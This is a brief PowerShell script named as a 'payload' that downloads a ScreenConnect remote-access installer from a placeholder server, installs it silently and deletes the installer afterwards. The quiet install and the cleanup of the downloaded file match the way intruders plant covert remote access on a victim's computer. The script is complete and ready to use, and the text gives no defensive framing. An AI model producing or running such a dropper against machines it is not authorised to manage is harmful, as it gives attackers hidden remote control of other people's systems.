# payload.ps1 – downloads and installs ScreenConnect MSI
$msiUrl = "http://your-server/ScreenConnect.ClientSetup.msi"   # Change to your MSI location
$msiPath = "$env:TEMP\ScreenConnect.msi"

# Download the MSI
Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath

# Install silently
Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$msiPath`" /quiet" -Wait

# Cleanup
Remove-Item $msiPath -Force